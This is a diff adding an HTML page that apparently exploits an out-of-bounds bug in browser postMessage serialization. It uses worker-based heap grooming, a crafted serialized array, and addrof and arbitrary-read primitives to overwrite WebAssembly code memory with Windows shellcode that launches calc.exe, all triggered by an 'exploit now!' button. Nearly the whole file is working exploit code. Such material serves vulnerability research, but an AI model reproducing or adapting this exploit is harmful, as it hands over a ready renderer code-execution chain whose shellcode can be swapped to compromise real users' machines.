@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Exp for OOB in postMessage by p4nda</title>
+</head>
+<body>
+<script type="text/javascript">
+	// configure
+	var height = 0x1ffff;
+	var width  = 0x1000;
+	var occupation = 0x7ffff000;
+	var loop_max= 0x100;		
+	var mem_holder ;
+	var post_arr;
+	var arr_len = 30;
+
+	var div = document.createElement("div");
+	document.body.append(div);
+	div.innerHTML="";
+	// tools funciton
+	function log(str){
+		div.innerHTML += "<h3>"+str+"</h3>";
+		console.log(str);
+	}
+	function sleep(milliseconds) {
+		var start = new Date().getTime();
+		for (var i = 0; i < 1e700; i++) {
+			if ((new Date().getTime() - start) > milliseconds) {
+				break;
+			}
+		}
+	}
+	// real function
+	function victim_worker(e){
+		function sleep(milliseconds) {
+			var start = new Date().getTime();
+			for (var i = 0; i < 1e700; i++) {
+				if ((new Date().getTime() - start) > milliseconds) {
+					break;
+				}
+			}
+		}
+		Array.prototype.toString = function x() {
+			function gc()
+			{
+				for (var i = 0; i < 200; i++)
+					new ArrayBuffer(0x100000);
+			}
+			console.log("[*] callback: toString called, shrinking Array");
+
+			this.length = 3;
+
+			gc()
+			delete Array.prototype.toString;
+			return this.length;
+		};
+		var result = e.data;
+		oobObj = result[0];
+		dataview = result[1];
+		oobObj[19] = dataview.buffer; // make dataview's element point to itself ArrayBuffer
+
+		var victim_arraybuffer = new ArrayBuffer(0x200);
+		dataview[1] = 0x200;		  // make dataview's ArrayBuffer length be 0x200
+		dataview[2] = victim_arraybuffer;		// make dataview.buffer 's backing_store point to victim ArrayBuffer
+
+		function utf8ToString(h, p) {
+		  let s = "";
+		  for (i = p; h[i]; i++) {
+		    s += String.fromCharCode(h[i]);
+		  }
+		  return s;
+		}
+		var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,1,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,112,52,110,100,97,0,1,10,145,128,128,128,0,1,139,128,128,128,0,1,1,127,65,16,16,0,26,32,0,11,11,150,128,128,128,0,1,0,65,16,11,16,72,97,99,107,101,100,32,98,121,32,80,52,110,100,97,0]);
+
+		var wasmImports = {
+			env: {
+				puts: function puts (index) {
+				console.log(utf8ToString(h, index));
+				}
+			}
+		};
+		let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
+		let h = new Uint8Array(m.exports.memory.buffer);
+		let f = m.exports.p4nda;
+		f();
+		var victim_view = new DataView(victim_arraybuffer);
+		function tos(data){
+			return "0x"+data.toString(16);
+		}
+		function modify_backing_store(addr){ // modify victim_arraybuffer's backing_store
+			var view = new DataView(dataview.buffer, 0x20 - 1);
+			view.setBigInt64(0 , addr ,true);
+		}
+		function addrof(obj){
+			victim_arraybuffer[1] = obj;
+			var view =  new DataView(dataview.buffer, 0x10 - 1); // victiom 's element
+			var element = view.getBigInt64(0,true);
+			console.log("[+] element addr : "+tos(element));
+			modify_backing_store(element - 1n + 0x18n );
+			var obj_addr = victim_view.getBigInt64(0,true);
+			console.log("[+] obj_addr addr : "+tos(obj_addr));
+			return obj_addr;
+		}
+		function arbitrary_read(addr){
+			modify_backing_store(addr);
+			var content = victim_view.getBigInt64(0,true);
+			console.log("[+] "+tos(addr) + ": " + tos(content) );
+			return content;			
+		}
+		var wasm_addr = addrof(f);
+		var SharedFunctionInfo_addr = arbitrary_read(wasm_addr + 0x17n);
+		var WasmExportedFunctionData_addr  = arbitrary_read(SharedFunctionInfo_addr + 0x7n);
+		var WasmInstanceObject_addr = arbitrary_read(WasmExportedFunctionData_addr + 0xfn);
+		var wasm_addr = arbitrary_read(WasmInstanceObject_addr + 0xe7n);
+		modify_backing_store(wasm_addr);
+		var write_tmp =  new Uint8Array(victim_arraybuffer);
+		let shellcode =[252, 72, 131, 228, 240, 232, 192, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 139, 72, 24, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, 208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 87, 255, 255, 255, 93, 72, 186, 1, 0, 0, 0, 0, 0, 0, 0, 72, 141, 141, 1, 1, 0, 0, 65, 186, 49, 139, 111, 135, 255, 213, 187, 240, 181, 162, 86, 65, 186, 166, 149, 189, 157, 255, 213, 72, 131, 196, 40, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 89, 65, 137, 218, 255, 213, 99, 97, 108, 99, 46, 101, 120, 101, 0];
+		write_tmp.set(shellcode);
+		console.log("[+] calc.exe is on the way ... ");
+		f();
+	}
+	function step2(){
+		log("[+] Step 2: post message ");
+		var blobURL = URL.createObjectURL(new Blob(['onmessage=', victim_worker.toString()], { type: 'application/javascript' }));
+		var worker = new Worker(blobURL);
+		worker.postMessage(post_arr);
+		log("[+] Step 2: finished")
+	}
+
+	function mem_occupy_worker(){
+
+		function loop(x){
+			args = x.data;
+			loop_max = x.data[0];
+			occupation = x.data[1];
+			//console.log(loop_max,occupation);
+			var arr = [];
+			for (var i = 0 ; i < loop_max ; i++){
+				try{
+					var a = new ArrayBuffer(occupation);
+					arr.push(a);
+				}
+				catch(e){
+					console.log(e);
+					break;
+				}
+				postMessage(i);
+			}
+			console.log("[+] finish occupation");
+			postMessage("done");
+		}
+		var blobURL = URL.createObjectURL(new Blob(['onmessage=', loop.toString()], { type: 'application/javascript' }));
+		var worker = new Worker(blobURL);
+		worker.postMessage([loop_max,occupation]);
+		return worker;
+	}
+	function mem_occupy(e){
+		var tmp = e.data;
+		if (tmp == 'done'){
+			log('[+] Step 1: finished');
+			step2()
+		}
+		else{
+			console.log(tmp);
+		}
+		return;
+
+	}
+	function release_mem() {
+		// body...
+		mem_holder.terminate();
+		console.log("[*] release memory");
+		sleep(2000);
+		console.log("[*] sleep finished");
+		var result = new Array(20);
+		result.fill(1);
+		return result;
+		//return result;
+	}
+	// 
+	function exp(){ //wait for debug
+		var d = document.getElementById("button");   
+		d.style.display="none";
+		d.parentNode.removeChild(d);
+		log("Start");
+		log("[+]Step 0: prepare data");
+		var arr = [];
+		arr[0] = new ImageData(height,width);
+		arr.__defineGetter__(1, release_mem);
+		arr[2] = new ImageData(height,width);
+		buffer = arr[2].data;
+		var arrElement = "-".repeat(19) + "U\x30" + "-".repeat(7);
+		var str = '"\x06length^\x00U\x02A\x01y$\x00\x01@\x03\x03' + arrElement + '$\x00' + String.fromCharCode(arr_len);
+		for (var i = str.length - 1, j = buffer.byteLength - 1; i >= 0; i-- , j--) {
+			buffer[j] = str.charCodeAt(i);
+		}
+		post_arr = new Array(arr_len);
+		post_arr.fill(1)
+		post_arr = Object.keys(post_arr);
+		post_arr[0] = {0:1,1:1};
+		post_arr[1] = new DataView(new ArrayBuffer(0x10)) ;		
+		post_arr[2] = arr;
+		log("[+]Step 0: finished");
+		log("[+]Step 1: occupy memory");
+		mem_holder = mem_occupy_worker();
+		mem_holder.onmessage = mem_occupy;
+		
+	}
+</script>
+<button onclick="exp()" id="button">exploit now!</button>
+</body>
+</html>
+
